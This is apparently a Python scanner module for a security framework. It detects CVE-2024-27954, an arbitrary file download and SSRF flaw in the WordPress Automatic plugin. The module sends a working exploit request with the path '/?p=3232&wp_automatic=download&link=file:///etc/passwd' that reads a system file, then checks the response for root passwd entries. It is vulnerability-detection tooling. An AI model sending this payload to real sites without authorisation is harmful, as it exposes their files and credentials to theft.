#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Automatic plugin <3."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Automatic Plugin <3.92.1 - Arbitrary File Download and SSRF Detection',
        'description': 'WordPress Automatic plugin <3.92.1 is vulnerable to unauthenticated Arbitrary File Download and SSRF Located in the downloader.php file, could permit attackers to download any file from a site. Sensitive data, including login credentials and backup files, could fall into the wrong hands. This vulnerability has been patched in version 3.92.1.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'wpscan', 'cve2024', 'wp', 'wordpress', 'wp-plugin', 'lfi', 'ssrf', 'wp-automatic', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/53b97401-1352-477b-a69a-680b01ef7266/',
            'https://securityonline.info/40000-sites-exposed-wordpress-plugin-update-critical-cve-2024-27956-cve-2024-27954/#google_vignette',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27954',
        ],
        'cve': 'CVE-2024-27954',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?p=3232&wp_automatic=download&link=file:///etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('"link":"file:',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in body for m in body_any)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='critical',
                reason="WordPress Automatic Plugin <3.92.1 - Arbitrary File Download and SSRF detected",
                path='/?p=3232&wp_automatic=download&link=file:///etc/passwd',
            )
            return True
        return False

